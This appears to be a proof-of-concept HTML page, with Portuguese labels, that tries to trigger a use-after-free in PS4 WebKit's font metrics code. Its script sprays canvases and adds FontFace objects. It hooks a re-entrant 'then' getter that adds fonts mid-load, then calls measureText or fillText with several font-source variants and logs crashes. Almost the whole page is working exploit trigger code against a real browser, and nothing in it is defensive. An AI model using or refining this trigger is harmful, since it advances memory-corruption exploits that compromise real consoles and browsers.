<!DOCTYPE html>
<p>UAF — FontMetrics — PS4 WebKit</p>
<div>
  <b>measureText (Site 1)</b><br>
  <button onclick="run('url(&quot;resources/Ahem.woff&quot;)')">V1 — Ahem direto</button>
  <button onclick="runFetch('measure')">V2 — Ahem Blob URL</button>
  <button onclick="run('url(&quot;data:font/ttf;base64,' + &quot;A&quot;.repeat(1100000) + &quot;&quot;)')">V3 — fake data URL</button>
  <button onclick="run(&quot;local(\&quot;nonexistent-xyz\&quot;)&quot;)">V4 — local inexistente</button>
  <button onclick="run(&quot;local(\&quot;Helvetica\&quot;)&quot;)">V5 — local Helvetica</button>
</div>
<div>
  <b>fillText (Site 2)</b><br>
  <button onclick="run('url(&quot;resources/Ahem.woff&quot;)', true)">V1 fill — Ahem direto</button>
  <button onclick="runFetch('fill')">V2 fill — Ahem Blob URL</button>
  <button onclick="run('url(&quot;data:font/ttf;base64,' + &quot;A&quot;.repeat(1100000) + &quot;&quot;)', true)">V3 fill — fake data URL</button>
  <button onclick="run(&quot;local(\&quot;nonexistent-xyz\&quot;)&quot;, true)">V4 fill — local inexistente</button>
  <button onclick="run(&quot;local(\&quot;Helvetica\&quot;)&quot;, true)">V5 fill — local Helvetica</button>
</div>
<pre id="log"></pre>
<script>
const log = s => document.getElementById('log').textContent += s + '\n';

function core(src, fill) {
  const id = Date.now();
  const dummies = [];
  for (let i = 0; i < 500; i++) {
    const d = document.createElement('canvas');
    d.width = 1; d.height = 1;
    d.getContext('2d').font = `10px "Z${id}_${i}"`;
    dummies.push(d);
  }
  const face = new FontFace('FF' + id, src);
  document.fonts.add(face);
  void face.loaded;
  const c = document.createElement('canvas');
  c.width = 64; c.height = 64;
  const ctx = c.getContext('2d');
  ctx.font = `10px Times, FF${id}`;
  let r = false;
  Object.defineProperty(face, 'then', {
    configurable: true,
    get() {
      if (r) return undefined;
      r = true;
      document.fonts.add(new FontFace('U' + Date.now(), 'local("x")'));
      r = false;
      return undefined;
    }
  });
  if (fill) ctx.fillText('\u13A0\u13A2\u13A4', 0, 32);
  else ctx.measureText('\u13A0\u13A2\u13A4');
}

function run(src, fill = false) {
  log(`[${fill?'fillText':'measureText'}] src=${src.slice(0,40)}...`);
  try { core(src, fill); log('sem crash'); }
  catch(e) { log('CRASH: ' + e); }
}

function runFetch(mode) {
  log(`[${mode}] fetch Ahem.woff → Blob URL...`);
  fetch('resources/Ahem.woff')
    .then(r => r.arrayBuffer())
    .then(b => {
      const url = URL.createObjectURL(new Blob([b], { type: 'font/woff' }));
      try { core(`url("${url}")`, mode === 'fill'); log('sem crash'); }
      catch(e) { log('CRASH: ' + e); }
    });
}
</script>
